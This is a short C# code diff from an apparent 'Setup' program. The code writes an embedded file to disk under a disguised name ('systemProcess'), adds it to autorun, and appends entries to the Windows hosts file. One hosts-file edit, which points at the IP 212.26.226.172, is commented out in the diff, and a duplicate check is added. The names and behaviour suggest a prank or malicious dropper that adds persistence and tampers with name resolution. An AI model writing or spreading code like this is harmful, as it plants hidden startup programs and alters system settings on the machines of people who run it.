@@ -22,7 +22,7 @@ namespace Setup
             {
                 File.WriteAllBytes(pathToPrikol, Resource1.SystemFile);
                 SetToAutorun("systemProcess");
-                ChangeHostsFile("localhost 212.26.226.172");
+                //ChangeHostsFile("\n\n127.0.0.1 http://212.26.226.172/");
             }
 
             catch(Exception ex)
@@ -48,9 +48,11 @@ namespace Setup
 
         static void ChangeHostsFile(string text)
         {
+            string pathToHosts = "C:\\Windows\\System32\\drivers\\etc\\hosts";
             try
             {
-                File.AppendAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", text);
+                if(!File.ReadAllText(pathToHosts).Contains(text))
+                    File.AppendAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", text);
             }
             catch(Exception ex)
             {
